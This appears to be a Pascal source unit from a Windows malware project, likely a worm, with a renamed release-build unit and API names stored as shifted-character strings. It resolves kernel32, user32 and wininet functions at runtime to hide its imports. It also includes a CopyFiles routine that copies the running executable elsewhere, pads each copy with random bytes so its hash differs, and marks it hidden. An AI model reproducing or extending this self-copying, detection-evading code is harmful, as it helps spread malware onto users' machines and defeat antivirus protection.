   {$I CompMode.INI}

   {$IFDEF Debug}
   UNIT Utils;
   {$ELSE}
   UNIT A6;
   {$ENDIF}

   INTERFACE

   {$IFDEF Debug}
   USES GetProc;
   {$ELSE}
   USES A3;
   {$ENDIF}

   VAR
     pDllProcesses : ARRAY [1..24] OF Pointer;
     StartEXEName  : STRING;

   CONST
     INADDR_NONE           = -1;
     INADDR_ANY            = $00000000;
     CRLF                  = #13#10;
     WM_DESTROY            = 2;
     TH32CS_SNAPPROCESS    = 2;
     FILE_ATTRIBUTE_HIDDEN = 2;
     ERROR_SUCCESS         = 0;
     HKEY_CURRENT_USER     = $80000001;
     HKEY_LOCAL_MACHINE    = $80000002;
     faHidden              = $00000002;
     faSysFile             = $00000004;
     faVolumeID            = $00000008;
     faDirectory           = $00000010;
     faAnyFile             = $0000003F;
     MB_ICONHAND           = $00000010;
     INVALID_HANDLE_VALUE  = LONGWORD(-1);
     MAX_PATH              = 260;
     WAIT_TIMEOUT          = 258;
     VER_PLATFORM_WIN32_NT = 2;
     DRIVE_FIXED           = 3;
     SW_HIDE               = 0;
     SW_SHOW               = 1;
     GWL_EXSTYLE           = -20;
     WS_EX_TOOLWINDOW      = 128;
     SUCCESS_SUCCESS       = 0;
     Chars : STRING        = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdevghijklmnopqrstuvwxyz';
     WS_OVERLAPPED         = 0;
     WS_CAPTION            = $C00000;
     WS_SYSMENU            = $80000;
     WS_THICKFRAME         = $40000;
     WS_MINIMIZEBOX        = $20000;
     WS_MAXIMIZEBOX        = $10000;
     WS_VISIBLE            = $10000000;
     WS_OVERLAPPEDWINDOW   = (WS_OVERLAPPED OR WS_CAPTION OR WS_SYSMENU OR WS_THICKFRAME OR WS_MINIMIZEBOX OR WS_MAXIMIZEBOX);
     STD_OUTPUT_HANDLE : longint  = -11;

   TYPE
     DWORD      = LongWord;
     BOOL       = LongBool;
     LPDWORD    =^DWORD;
     HWND       = TYPE LongWord;
     THandle    = Integer;
     LRESULT    = DWORD;
     ATOM       = WORD;
     HICON      = TYPE LongWord;
     HBRUSH     = TYPE LongWord;
     HINST      = TYPE LongWord;
     HMENU      = TYPE LongWord;
     HCURSOR    = HICON;
     UINT       = LongWord;
     TFNWndProc = Pointer;
     WPARAM     = DWORD;
     LPARAM     = DWORD;

     XArray = ARRAY[1..500] OF STRING;

     TWndClass = PACKED RECORD
       style         : UINT;
       lpfnWndProc   : TFNWndProc;
       cbClsExtra    : Integer;
       cbWndExtra    : Integer;
       hInstance     : HINST;
       hIcon         : HICON;
       hCursor       : HCURSOR;
       hbrBackground : HBRUSH;
       lpszMenuName  : PAnsiChar;
       lpszClassName : PAnsiChar;
     END;

     TPoint = RECORD
       X : Integer;
       Y : Integer;
     END;

     TMsg = PACKED RECORD
       hwnd    : HWND;
       message : UINT;
       wParam  : WPARAM;
       lParam  : LPARAM;
       time    : DWORD;
       pt      : TPoint;
     END;

     lpup = ARRAY[0..512] OF Char;

     TOSVersionInfo = RECORD
       dwOSVersionInfoSize : DWORD;
       dwMajorVersion      : DWORD;
       dwMinorVersion      : DWORD;
       dwBuildNumber       : DWORD;
       dwPlatformId        : DWORD;
       szCSDVersion        : ARRAY [0..127] OF AnsiChar;
     END;

     TProcessEntry32 = RECORD
       dwSize              : Cardinal;
       cntUsage            : Cardinal;
       th32ProcessID       : Cardinal;
       th32DefaultHeapID   : Cardinal;
       th32ModuleID        : Cardinal;
       cntThreads          : Cardinal;
       th32ParentProcessID : Cardinal;
       pcPriClassBase      : Integer;
       dwFlags             : Cardinal;
       szExeFile           : ARRAY [0..259] OF Char;
     END;

     PProtoEnt = ^TProtoEnt;
     protoent = record
       p_name: PChar;
       p_aliases: ^Pchar;
       p_proto: Smallint;
     end;
     TProtoEnt = protoent;

    PServEnt = ^TServEnt;
     servent = record
       s_name: PChar;
       s_aliases: ^PChar;
       s_port: Word;
       s_proto: PChar;
     end;
     TServEnt = servent;

   {$I Resources\TMAIN.INI}
   {$I Resources\TMAPIProcess.INI}
   {$I Resources\TUSER32Process.INI}
   {$I Resources\TKernel32Process.INI}

   VAR
     MainStr                  : XArray;
     //////////////////////////////\KERNEL32.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
     CreateDir                : FUNCTION(lpPathName:STRING;lpSecurityAttributes:Integer) : BOOL; STDCALL;
     GetLastError             : FUNCTION : DWORD; STDCALL;
     TerminateProcess         : FUNCTION(hProcess,uExitCode:Cardinal) : BOOL; STDCALL;
     OpenProcess              : FUNCTION(wDesiredAccess:Cardinal;blnheritHandle:LongBool;dwProcessld:Cardinal) : Integer; STDCALL;
     CloseHandle              : FUNCTION(hObject:Cardinal) : BOOl; STDCALL;
     Process32First           : FUNCTION(hSnapshot:Integer;VAR lppe:TProcessEntry32) : BOOL; STDCALL;
     CreateToolHelp32Snapshot : FUNCTION(dwFlags,th32ProcessID:Cardinal) : Integer; STDCALL;
     Process32Next            : FUNCTION(hSnapshot:Cardinal;VAR lppe:TProcessEntry32) : BOOL; STDCALL;
     WaitForSingleObject      : FUNCTION(hHandle,dwMilliseconds:Cardinal) : Cardinal; STDCALL;
     CreateMutexA             : FUNCTION(lpMutexAttributes:Pointer;bInitialOwner:BOOL;lpName:STRING) : Cardinal; STDCALL;
     GetVersionEx             : FUNCTION(VAR lpVersionInformation:TOSVersionInfo) : BOOL; STDCALL;
     GetDriveType             : FUNCTION(lpDisk:STRING) : Integer; STDCALL;
     CopyFile2                : FUNCTION(lpExistingFileName,lpNewFileName:PChar;bFailIfExists:BOOL) : BOOL; STDCALL;
     SetFileAttributes        : FUNCTION(lpFileName:pChar;dwFileAttributes:DWORD) : LongBool; STDCALL;
     GetWindowsDirectory      : FUNCTION(lpBuffer:PChar;uSize:DWORD): DWORD; STDCALL;
     GetStdHandle             : FUNCTION(nStdHandle: DWORD): THandle; STDCALL;
     ///////////////////////////////\USER32.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
     ShowWindow               : FUNCTION(hWnd:HWND;nCmdShow:Integer) : BOOL; STDCALL;
     SetWindowLong            : FUNCTION(hWnd:HWND;nIndex:Integer;dwNewLong:DWORD) : DWORD; STDCALL;
     GetWindowLong            : FUNCTION(hWnd,nIndex:Integer) : Integer; STDCALL;
     GetMessage               : FUNCTION(VAR lpMsg:TMsg;hWnd:HWND;wMsgFilterMin,wMsgFilterMax:UINT) : BOOL; STDCALL;
     KillTimer                : FUNCTION(hWnd:HWND;uIDEvent:UINT) : BOOL; STDCALL;
     SetTimer                 : FUNCTION(hWnd:HWND;nIDEvent,uElapse:UINT;lpTimerFunc:Pointer) : UINT; STDCALL;
     PostQuitMessage          : PROCEDURE(nExitCode:Integer); STDCALL;
     DefWindowProc            : FUNCTION(hWnd:HWND;Msg:UINT;wParam:WPARAM;lParam:LPARAM) : LRESULT; STDCALL;
     DispatchMessage          : FUNCTION(CONST lpMsg: TMsg) : DWORD; STDCALL;
     MessageBox               : FUNCTION(hWnd:HWND;lpText,lpCaption:PChar;uType:UINT) : Integer; STDCALL;
     RegisterClass            : FUNCTION(CONST WndClass:TWndClass) : ATOM; STDCALL;
     ///////////////////////////////\SHLWAPI.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
     FileExists               : FUNCTION(pszPath:STRING) : BOOL; STDCALL;
     ///////////////////////////////\WININET.DLL/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
     InternetGetConnectedState: FUNCTION(lpdwFlags:LPDWORD;dwReserved:DWORD) : BOOL; STDCALL;

   PROCEDURE InitProcesses;
   PROCEDURE DecodeAllStrings;
   FUNCTION  IntToHex2(X:BYTE) : STRING;
   PROCEDURE GetAddr(Lib:pChar;sArray:pChar);
   FUNCTION  ExtractFileName(FileName:STRING) : STRING;
   PROCEDURE CopyFiles(Hide:BOOL;DestinationFile:STRING);
   FUNCTION  DecodeStrings(EncodedString:pChar;VAR DecodedString:XArray) : WORD;
   FUNCTION  LoadLibrary(LibFileName:PChar) : THandle; STDCALL; EXTERNAL 'kernel32.dll' Name 'LoadLibraryA';

   IMPLEMENTATION

   PROCEDURE DecodeAllStrings;
   BEGIN
     DecodeStrings(TMAIN,MainStr);
   END;

   PROCEDURE CopyFiles(Hide:BOOL;DestinationFile:STRING);
   LABEL
     Abort, Close;
   VAR
     I           : WORD;
     F           : FILE;
     RandomBytes : ARRAY[0..512] OF BYTE;
   BEGIN
     CopyFile2(pChar(StartEXEName),pchar(DestinationFile),False);
     FOR I:=0 TO 512 DO RandomBytes[I]:=Random(255);
     AssignFile(F,DestinationFile);
     {$I-}
     Reset(F,1);
     IF IOResult<>0 THEN GOTO Abort;
     Seek(F,(FileSize(F) DIV 512)*512);
     IF IOResult<>0 THEN GOTO Close;
     Truncate(F);
     BlockWrite(F,RandomBytes[0],Random(508));
     IF IOResult<>0 THEN GOTO Close;
     Close:
     CloseFile(F);
     {$I+}
     IF Hide THEN SetFileAttributes(pChar(DestinationFile),FILE_ATTRIBUTE_HIDDEN);
     Abort:
   END;

   PROCEDURE GetAddr(Lib:pChar;sArray:pChar);
   VAR
     I   : BYTE;
     O   : XArray;
     L   : THandle;
   BEGIN
     L:=LoadLibrary(LIB);
     FOR I:=1 TO DecodeStrings(sArray,O) DO pDllProcesses[I]:=GetProcAddress(L,pChar(O[I]));
   END;

   PROCEDURE InitProcesses;
   BEGIN
     GetAddr(pChar(MainStr[57]),TKernel32Process);                                 //"kernel32.dll"

     CreateDir:=pDllProcesses[1];
     GetLastError:=pDllProcesses[2];
     TerminateProcess:=pDllProcesses[3];
     OpenProcess:=pDllProcesses[4];
     CloseHandle:=pDllProcesses[5];
     Process32First:=pDllProcesses[6];
     CreateToolHelp32Snapshot:=pDllProcesses[7];
     Process32Next:=pDllProcesses[8];
     WaitForSingleObject:=pDllProcesses[9];
     CreateMutexA:=pDllProcesses[10];
     GetVersionEx:=pDllProcesses[11];
     GetDriveType:=pDllProcesses[12];
     CopyFile2:=pDllProcesses[13];
     SetFileAttributes:=pDllProcesses[14];
     GetWindowsDirectory:=pDllProcesses[15];
     GetStdHandle:=pDllProcesses[16];
     WaitForSingleObject:=pDllProcesses[17];

     GetAddr(pChar(MainStr[99]),TUSER32Process);                                   //"user32.dll"

     ShowWindow:=pDllProcesses[1];
     SetWindowLong:=pDllProcesses[2];
     GetWindowLong:=pDllProcesses[3];
     GetMessage:=pDllProcesses[4];
     KillTimer:=pDllProcesses[5];
     SetTimer:=pDllProcesses[6];
     PostQuitMessage:=pDllProcesses[7];
     DefWindowProc:=pDllProcesses[8];
     DispatchMessage:=pDllProcesses[9];
     MessageBox:=pDllProcesses[10];
     RegisterClass:=pDllProcesses[11];

     FileExists:=GetProcAddress(LoadLibrary(pChar(MainStr[60])),pChar(MainStr[61])); //"shlwapi.dll","PathFileExistsA"
     InternetGetConnectedState:=GetProcAddress(LoadLibrary(pChar(MainStr[62])),pChar(MainStr[63])); //"wininet.dll","InternetGetConnectedState"
   END;

   FUNCTION DecodeStrings(EncodedString:pChar;VAR DecodedString:XArray) : WORD;
   VAR
     I : WORD;
     B : WORD;
     S : STRING;
   BEGIN
     FOR I:=0 TO Length(EncodedString)-1 DO S:=S+Chr(Ord(EncodedString[I])-100);
     S:=S+',';
     I:=1;
     REPEAT
       B:=Pos(',',S);
       DecodedString[I]:=pChar(Copy(S,1,B-1));
       Delete(S,1,B);
       Inc(I);
     UNTIL Length(S)=0;
     RESULT:=I-1;
   END;

   FUNCTION IntToHex2(X:BYTE) : STRING;
   BEGIN
     IntToHex2:=Concat(Chars[X SHR 4+1],Chars[X AND 15+1]);
   END;

   FUNCTION ExtractFileName(FileName:STRING) : STRING;
   VAR
     I : Integer;
   BEGIN
     I:=Length(FileName);
     WHILE(I>=1)AND NOT(FileName[I] IN ['\',':']) DO Dec(I);
     RESULT:=Copy(FileName,I+1,255);
     IF (Length(RESULT)>0)AND(RESULT[Length(Result)]=#0) THEN Setlength(RESULT,Length(RESULT)-1);
   END;

   END.
